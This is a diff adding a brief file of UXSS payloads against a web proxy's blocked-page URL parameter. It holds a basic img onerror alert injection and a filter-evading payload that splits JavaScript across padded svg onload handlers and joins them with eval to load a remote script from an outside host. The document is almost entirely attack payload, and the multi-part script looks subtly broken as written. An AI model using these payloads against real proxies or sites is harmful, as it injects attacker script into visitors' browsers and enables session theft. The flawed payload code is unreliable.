@@ -1,0 +1,19 @@
+
+UXSS  in proxy
+http://example.com/ooops/d35fs23hu73ds/blocked.html?abcd=%3Cimg%20src=x%20onerror=%22alert(1)%22%3E
+
+Complex UXSS payload to load remote script
+
+http://www.asdfcom.com/ooops/d35fs23hu73
+ds/blocked.html?abcdeaaaaaaaaaaaaaaaaaaaa=
+<svg junk="aaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+" onload="s='document.createElement'" >
+</svg>&aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=
+<svg junk="aaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+" onload="s+='(\'script\');">bbbbbbbbbbb
+</svg>&aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=
+<svg junk="aaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+" onload="s+='s.src=\'//state.actor\'" >
+</svg>&aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=
+<svg junk="aaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+" onload="eval(s)" ></svg>
